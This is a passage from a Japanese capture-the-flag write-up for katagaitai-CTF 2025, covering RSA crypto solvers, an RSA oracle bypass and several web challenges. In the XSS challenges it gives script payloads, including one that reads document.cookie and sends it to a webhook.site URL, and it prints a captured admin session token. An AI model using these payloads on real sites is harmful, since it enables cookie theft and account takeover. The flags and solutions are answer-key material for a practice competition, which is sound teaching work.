</span></span><span class="line"><span class="cl">    <span class="n">phi</span><span class="o">=</span><span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">d</span><span class="o">=</span><span class="nb">pow</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="n">phi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">m</span><span class="o">=</span><span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">N</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">)))</span></span></span></code></pre></div></div>
</figure>
<p><code>katagaitai-CTF{7w0_pr1m3_numb3r5_mu57_b3_1nd3p3nd3n7}</code></p>
<h3 id="oracle-service1-387-medium-hard-33-solves">oracle service1 (387 medium-hard [33 Solves])</h3>
<blockquote>
<p>ワード制限をバイパスできますか？その1<br>
nc ~</p>
</blockquote>
<p>任意の平文（Hex）の暗号文を聞けるオラクルが与えられる．
ソースコードより，復号結果が<code>b&quot;katagaitai-CTF&quot;</code>となる暗号文を入力するとflagが得られる．
しかし，暗号化では<code>b&quot;katagaitai-CTF&quot;</code>となる平文は制限されている．</p>



<figure class="xCodeBlock">
<figcaption class="xCodeBlock_title">service.py</figcaption>
<div class="xCodeBlock_code"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flag</span> <span class="kn">import</span> <span class="n">FLAG</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">MENU</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">1. Encryption.
</span></span></span><span class="line"><span class="cl"><span class="s2">2. Decryption.
</span></span></span><span class="line"><span class="cl"><span class="s2">3. Exit.
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 平文を暗号化する関数</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">N</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 16進数形式でデータの入力を受け付けて、bytes型に変換</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">message</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;input your message (hex)&gt; &#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Bye!!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># データに &#34;katagaitai-CTF&#34;が含まれていないかチェック</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="sa">b</span><span class="s2">&#34;katagaitai-CTF&#34;</span> <span class="ow">in</span> <span class="n">message</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Contains restricted words!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">bytes_to_long</span><span class="p">(</span><span class="n">message</span><span class="p">),</span> <span class="n">e</span><span class="p">,</span> <span class="n">N</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 暗号文を復号する関数</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">d</span><span class="p">,</span> <span class="n">N</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 16進数形式で暗号文の入力を受け付けて、bytes型に変換</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">cipher</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;input your cipher (hex)&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Bye!!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">cipher</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">N</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># 暗号文の復号結果がkatagaitai-CTFの場合、FLAGを表示</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">data</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">&#34;katagaitai-CTF&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Great!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;FLAG is </span><span class="si">{</span><span class="n">FLAG</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Bad!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">getStrongPrime</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">q</span> <span class="o">=</span> <span class="n">getStrongPrime</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">N</span> <span class="o">=</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span>
</span></span><span class="line"><span class="cl">    <span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">e</span> <span class="o">=</span> <span class="mh">0x10001</span>
</span></span><span class="line"><span class="cl">    <span class="n">d</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">phi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=== Oracle Service1 ===</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;N = </span><span class="si">{</span><span class="n">N</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">MENU</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">choice</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">choice</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s2">&#34;1&#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Bye!!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">choice</span> <span class="o">==</span> <span class="s2">&#34;1&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">encrypt</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">choice</span> <span class="o">==</span> <span class="s2">&#34;2&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">decrypt</span><span class="p">(</span><span class="n">d</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span></span></span></code></pre></div></div>
</figure>
<p>RSAの暗号化では，$c=m^e\bmod N$ である．また，$(N+1) \bmod N = 1$ であるので，<br>
$$c \equiv m^e \equiv m^e \cdot 1 \equiv m^e \cdot 1^e \equiv m^e \cdot (N+1)^e \equiv (m \cdot (N+1))^e \bmod N$$
が成り立つので，
<code>b&quot;katagaitai-CTF&quot;</code>に $(N+1)$ を掛けたものを平文として暗号化すると，制限されることなく暗号化できる．</p>



<figure class="xCodeBlock">
<figcaption class="xCodeBlock_title">Solver.py</figcaption>
<div class="xCodeBlock_code"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">N</span> <span class="o">=</span> <span class="mi">17729623498209258078139145367274935313867758324944018326324892604168504326616208284063335154172848284406203010134162595593712311078350951547533585536359142406900347931338027783845099450965883367370765166102573115345962855785471216045220495308756900009327457877715335668777443907863030190824853647250421187258030207057532648388610447841349954757304835281208121287666162711615761012985625512480450856337967342612490058842436271628981005082512963478367593448029554297069913549724945492725271430062024907745868194294276347684290936085019563220334248546706582193768475398191292115680252033796487439716478505007387900281771</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">byte_string</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;katagaitai-CTF&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">hex_string</span> <span class="o">=</span> <span class="n">byte_string</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">hex_string</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">N</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 3ae926e8d3fc9722fd8b3201c295738e914c9aaca455de390d0fdca7ba68c99c641b2edc648a54217cea24c757c0005bc5e3905d1d3c3d99c6fac7cedc3b7a7c5653950e244d34f52194117384ad5f43e56aae937b383d1f24c85212dd76854ec6fd06c8094cbf728a25d173bb4929591e9d0610fba662e006766d3e1c7c64f7caf82e2d65bc2619c845dde1132bb58d8b6855fae42b3400918d185a511176d37fcb5fe39325d6873443bfc8696fa472b3627fce3756042948a530f6dc4473593281e05e3f1cb6de0d598d920eacf35b53455bf4af80986d31387f7f4612f329c0911969a6ec5ca8402027e0e5e5b993a81aa3efd7390b6ba93fa8b179360af046ae6cd822351e3a30f972a07108</span></span></span></code></pre></div></div>
</figure>
<p>以下のように，flagが得られる．</p>
<pre tabindex="0"><code>$ nc crypto.katagaitai-ctf.com 9011
=== Oracle Service1 ===

N = 17729623498209258078139145367274935313867758324944018326324892604168504326616208284063335154172848284406203010134162595593712311078350951547533585536359142406900347931338027783845099450965883367370765166102573115345962855785471216045220495308756900009327457877715335668777443907863030190824853647250421187258030207057532648388610447841349954757304835281208121287666162711615761012985625512480450856337967342612490058842436271628981005082512963478367593448029554297069913549724945492725271430062024907745868194294276347684290936085019563220334248546706582193768475398191292115680252033796487439716478505007387900281771

1. Encryption.
2. Decryption.
3. Exit.

&gt; 1
input your message (hex)&gt; 3ae926e8d3fc9722fd8b3201c295738e914c9aaca455de390d0fdca7ba68c99c641b2edc648a54217cea24c757c0005bc5e3905d1d3c3d99c6fac7cedc3b7a7c5653950e244d34f52194117384ad5f43e56aae937b383d1f24c85212dd76854ec6fd06c8094cbf728a25d173bb4929591e9d0610fba662e006766d3e1c7c64f7caf82e2d65bc2619c845dde1132bb58d8b6855fae42b3400918d185a511176d37fcb5fe39325d6873443bfc8696fa472b3627fce3756042948a530f6dc4473593281e05e3f1cb6de0d598d920eacf35b53455bf4af80986d31387f7f4612f329c0911969a6ec5ca8402027e0e5e5b993a81aa3efd7390b6ba93fa8b179360af046ae6cd822351e3a30f972a07108
388906f7068e0e555c0ed2bd74ffd431b5a1ab44b8f7fb1938a503401e532597af2cf87f45f93387bd9e4be28b3fa19fb464118b1344acecf8ab0d5c9c31c68e9977ffdf4734efe60280c01d9c1b4ed6088ac958351c4d26dc97e5f16aded4f701d83972d61dc341956f546852e835e429e5d28341888528129654864c58fef94885ac5c43768e928afd1dc2e60fbcd4f6f5ddc1dc00ec8a94ef9af08dc363adf38e2930ea5bb784cd673ee503d89a57176a59a97daf1040b342421474f248ec7ab5531795bc95e7bce9425fdc6358be5ee5d989a54ff3dfe3bab305f6f733bb6d62bd0ec7972b5ae646f1ab44755c919e07efd73ba444f4b68f7e48d783151d

1. Encryption.
2. Decryption.
3. Exit.

&gt; 2
input your cipher (hex)&gt; 388906f7068e0e555c0ed2bd74ffd431b5a1ab44b8f7fb1938a503401e532597af2cf87f45f93387bd9e4be28b3fa19fb464118b1344acecf8ab0d5c9c31c68e9977ffdf4734efe60280c01d9c1b4ed6088ac958351c4d26dc97e5f16aded4f701d83972d61dc341956f546852e835e429e5d28341888528129654864c58fef94885ac5c43768e928afd1dc2e60fbcd4f6f5ddc1dc00ec8a94ef9af08dc363adf38e2930ea5bb784cd673ee503d89a57176a59a97daf1040b342421474f248ec7ab5531795bc95e7bce9425fdc6358be5ee5d989a54ff3dfe3bab305f6f733bb6d62bd0ec7972b5ae646f1ab44755c919e07efd73ba444f4b68f7e48d783151d
Great!
FLAG is katagaitai-CTF{y0u_c4n_c4lcul473_mul71pl1c4710n_0nly}
</code></pre><h3 id="oracle-service2-479-medium-hard-15-solves">oracle service2 (479 medium-hard [15 Solves])</h3>
<blockquote>
<p>ワード制限をバイパスできますか？その2<br>
nc ~</p>
</blockquote>
<p>先ほどはNが与えられたが，今度は与えられない．<br>
$a = 2^e \bmod N$ ，$b = 3^e \bmod N$，$c = 6^e \bmod N$ とする．このとき，<br>
$$ c = 6^e \bmod N = (2 \cdot 3)^e \bmod N = a\cdot b \bmod N$$
であるので，ある整数 $k$ を用いて，
$$c + k\cdot N = a\cdot b$$
よって，
$$k\cdot N = a\cdot b - c$$
が成り立つので，<code>b&quot;katagaitai-CTF&quot;</code>に $(k\cdot N+1)$ を掛けたものを平文として暗号化すると，制限されることなく暗号化できる．</p>
<h2 id="web">Web</h2>
<h3 id="http-world-pt1-50-warmup-70-solves">HTTP world Pt.1 (50 warmup [70 Solves])</h3>
<blockquote>
<p>HTTPの世界を探訪する前に、HTMLの世界をおさらいしましょう。<br>
<a href="http://web.katagaitai-ctf.com/http/step1.php"target="_blank" rel="noopener noreferrer">http://web.katagaitai-ctf.com/http/step1.php</a></p>
</blockquote>
<p>ページのソースを表示すると，コメントにflagが含まれる．</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>HTTP World Pt.1<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://cdn.tailwindcss.com&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;bg-black min-h-screen flex items-center justify-center&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;text-center p-8 bg-gray-900 rounded-lg shadow-xl border border-green-500 max-w-2xl w-full mx-4&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">h1</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;text-4xl font-mono text-green-500 mb-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            Welcome to the HTTP World!
</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;text-gray-300 text-xl font-mono&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            The flag is missing.
</span></span><span class="line"><span class="cl">            <span class="c">&lt;!-- katagaitai-CTF{HT_of_HTML_and_HTTP_means_HyperText} --&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><h3 id="http-world-pt2-50-warmup-68-solves">HTTP world Pt.2 (50 warmup [68 Solves])</h3>
<blockquote>
<p>改めてHTTPの世界を探訪しましょう。フラグはレスポンスのどこかに隠されています。<br>
<a href="http://web.katagaitai-ctf.com/http/step2.php"target="_blank" rel="noopener noreferrer">http://web.katagaitai-ctf.com/http/step2.php</a></p>
</blockquote>
<p>レスポンスヘッダーに含まれている．</p>
<pre tabindex="0"><code>connection: keep-alive
content-type: text/html; charset=UTF-8
date: Sun, 26 Jan 2025 11:07:35 GMT
server: nginx/1.27.3
transfer-encoding: chunked
x-katagaitai-flag: katagaitai-CTF{header_shoulder_knees_and_toes_gaitai}
x-powered-by: PHP/8.1.31
</code></pre><h3 id="http-world-pt3-88-easy-55-solves">HTTP world Pt.3 (88 easy [55 Solves])</h3>
<blockquote>
<p>アクセス先のミッションを達成して、4つの条件を満たすとフラグが取得できます。<br>
<a href="http://web.katagaitai-ctf.com/http/step3.php"target="_blank" rel="noopener noreferrer">http://web.katagaitai-ctf.com/http/step3.php</a></p>
</blockquote>
<p>アクセスし，Submit POST Requestボタンを押すと以下のようになった．残るは<code>PUT</code>と<code>DELETE</code>である．</p>
<p><img  src="https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/katagaitai-ctf2025/im10.png"
        alt="This is a image"/></p>
<p>Burp Suite Community Editionを用いて，以下のように<code>POST</code>の部分を<code>PUT</code>と<code>DELETE</code>にして送信する．
Cookieによって，どのオプションでアクセスしたかが記録されている．</p>
<p><img  src="https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/katagaitai-ctf2025/im11.png"
        alt="This is a image"/></p>
<p>4つとも実行するとレスポンスでflagが得られた．</p>
<pre tabindex="0"><code>        &lt;/ul&gt;
        &lt;p class=&#34;text-gray-300 text-xl font-mono mt-8&#34;&gt;
            Congratulations!&lt;br&gt;The flag is &lt;code&gt;katagaitai-CTF{Gakkari_shite_Method_Method_shite}&lt;/code&gt;&lt;/p&gt;
    &lt;/div&gt;
&lt;/body&gt;

&lt;/html&gt;
</code></pre><p><code>katagaitai-CTF{Gakkari_shite_Method_Method_shite}</code></p>
<h3 id="parroting-50-warmup-63-solves">Parroting (50 warmup [63 Solves])</h3>
<blockquote>
<p>あなたの目的はalert()関数を呼び出すことです。<br>
<a href="http://web.katagaitai-ctf.com/xss_warmup/index.php?text=hello"target="_blank" rel="noopener noreferrer">http://web.katagaitai-ctf.com/xss_warmup/index.php?text=hello</a></p>
</blockquote>
<p>入力フォームがある．問題文にあるように，alert()関数を呼び出すscriptを入力するとflagが表示された．</p>
<pre tabindex="0"><code>&lt;script&gt;alert()&lt;/script&gt;
</code></pre><p><code>katagaitai-CTF{:parrot:_Slack_Emoji_Alias_Has_Conflicted_So_Sad} </code></p>
<h3 id="xssns-pt1-82-warmup-56-solves">XSSNS Pt.1 (82 warmup [56 Solves])</h3>
<blockquote>
<p>本格的なXSSの問題に取り組む前に、CTF典型の報告機能を体験してもらいます。 「Report admin」のフォームにURLを投稿すると、管理者アカウントになりきったbotが指定のURLにアクセスしてくれます。
この管理者アカウントのユーザ名が最初のフラグです。<br>
<a href="http://web.katagaitai-ctf.com/xss/"target="_blank" rel="noopener noreferrer">http://web.katagaitai-ctf.com/xss/</a></p>
</blockquote>
<p>サイトにアクセスすると，LoginとRegisterのフォームがある．まず適当に登録する．</p>
<p><img  src="https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/katagaitai-ctf2025/im03.png"
        alt="This is a image"/></p>
<p>すると，My pageが表示される．
問題文にあるように，「Report admin」のフォームにURLを投稿すると、管理者アカウントになりきったbotが指定のURLにアクセスしてくれる．
My pageには，「Users visited you」にアクセスした人のユーザ名が表示されるようである．
問題文に管理者アカウントのユーザ名が最初のフラグと書いてあるので，自分のページのURLを投稿すればよさそう．</p>
<p><img  src="https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/katagaitai-ctf2025/im04.png"
        alt="This is a image"/></p>
<p>よって，以下のように入力して送信する．</p>
<p><img  src="https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/katagaitai-ctf2025/im05.png"
        alt="This is a image"/></p>
<p>Mu pageにもどると，flagが得られる．</p>
<p><img  src="https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/katagaitai-ctf2025/im06.png"
        alt="This is a image"/></p>
<p><code>katagaitai-CTF{mixi_2_15_n0w_4v4114b13}</code></p>
<h3 id="xssns-pt2-194-easy-33-solves">XSSNS Pt.2 (194 easy [33 Solves])</h3>
<blockquote>
<p>実践的なXSSに挑戦しましょう。<br>
今度の目的は管理者のユーザーエージェントを取得することです。<br>
先ほどと同じアプリを使用します。<br>
<a href="https://webhook.site/"target="_blank" rel="noopener noreferrer">https://webhook.site/</a> を使用すると、「Your unique URL」に対するアクセス内容がすべて記録されるため、お手軽な誘導先として使用できます。<br>
<a href="http://web.katagaitai-ctf.com/xss/"target="_blank" rel="noopener noreferrer">http://web.katagaitai-ctf.com/xss/</a></p>
</blockquote>
<p><a href="https://webhook.site/"target="_blank" rel="noopener noreferrer">https://webhook.site/</a> で自分のURLをコピーしておく．</p>
<pre tabindex="0"><code>Your unique URL
https://webhook.site/861b7ef1-0e6e-4dc3-9c97-f69bb609c45f
</code></pre><p>My pageの「Post title」に指定のURLにリダイレクトするスクリプトを投稿する．</p>
<pre tabindex="0"><code>&lt;script&gt;window.location.href=&#34;https://webhook.site/861b7ef1-0e6e-4dc3-9c97-f69bb609c45f&#34;;&lt;/script&gt;
</code></pre><p>その後，管理者アカウントbotがMy pageにアクセスするように先ほどと同様に以下のように入力して送信する．</p>
<p><img  src="https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/katagaitai-ctf2025/im05.png"
        alt="This is a image"/></p>
<p><a href="https://webhook.site/"target="_blank" rel="noopener noreferrer">https://webhook.site/</a> へアクセスすると，以下のようにbotのアクセス記録が確認できる．</p>
<p><img  src="https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/katagaitai-ctf2025/im07.png"
        alt="This is a image"/></p>
<p><code>katagaitai-CTF{Mozilla_AppleWebKit_Gecko_Chrome_Safari_CHAOS}</code></p>
<h3 id="xssns-pt3-226-medium-22-solver">XSSNS Pt.3 (226 medium [22 Solver])</h3>
<blockquote>
<p>今回のXSS集大成の課題は、管理者ユーザが作成した投稿を見ることです。<br>
先ほどと同じアプリを使用します。<br>
<a href="http://web.katagaitai-ctf.com/xss/"target="_blank" rel="noopener noreferrer">http://web.katagaitai-ctf.com/xss/</a><br>
管理者の投稿を見るためには、管理者になりすます必要があるということです。<br>
そもそもHTTPリクエストの中で、ユーザが誰であるかの特定はどのように行うのでしょうか。</p>
</blockquote>
<p>先ほどの指定のURLにリダイレクトするスクリプトに，Cookiesの内容を付与するようにする．</p>
<pre tabindex="0"><code>&lt;script&gt;
var cookies=document.cookie;
var redirectUrl = &#34;https://webhook.site/861b7ef1-0e6e-4dc3-9c97-f69bb609c45f?cookies=&#34; + encodeURIComponent(cookies);
window.location.href = redirectUrl;
&lt;/script&gt;
</code></pre><p>My pageの「Post title」に指定のURLにリダイレクトするスクリプトを投稿する．
その後，管理者アカウントbotがMy pageにアクセスするように先ほどと同様に以下のように入力して送信する．
<a href="https://webhook.site/"target="_blank" rel="noopener noreferrer">https://webhook.site/</a> へアクセスすると，以下のようにbotのアクセス記録が確認できる．</p>
<p><img  src="https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/katagaitai-ctf2025/im08.png"
        alt="This is a image"/></p>
<p>このことから，Cookiesは以下であることが確認できる．</p>
<pre tabindex="0"><code>token = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImthdGFnYWl0YWktQ1RGe21peGlfMl8xNV9uMHdfNHY0MTE0YjEzfSIsImlkIjoieVdCa1RoMjIwRkVaIiwiaWF0IjoxNzM3ODkzNjUyLCJleHAiOjE3Mzc4OTcyNTJ9.i5RcWrDgSeyTXFgyFGMk4aGljjuUQShVQuvc1an-pPw
</code></pre><p>このCookiesを指定して，Loginを押すと管理者アカウントのページに行けたが，投稿を見てもflagは見つからなかった．
まだゴールではないのだろうか．</p>
<p><img  src="https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/katagaitai-ctf2025/im09.png"
        alt="This is a image"/></p>
<h3 id="openapi-133-easy-47-solved">OpenAPI (133 easy [47 Solved])</h3>
<blockquote>
<p><a href="http://web.katagaitai-ctf.com/openapi/ping"target="_blank" rel="noopener noreferrer">http://web.katagaitai-ctf.com/openapi/ping</a> へリクエストすると、メッセージが帰ってきます。下記URLのドキュメントを隅々まで読んで見ながら、遊んでみてください。<br>
<a href="http://web.katagaitai-ctf.com/openapi/ui/#/Example/example_ping"target="_blank" rel="noopener noreferrer">http://web.katagaitai-ctf.com/openapi/ui/#/Example/example_ping</a></p>
</blockquote>
<p>このサイトをみると，<code>http://web.katagaitai-ctf.com/openapi/flag</code> へ以下のリクエストbodyをつけて送るとよさそう．</p>
<pre tabindex="0"><code>{
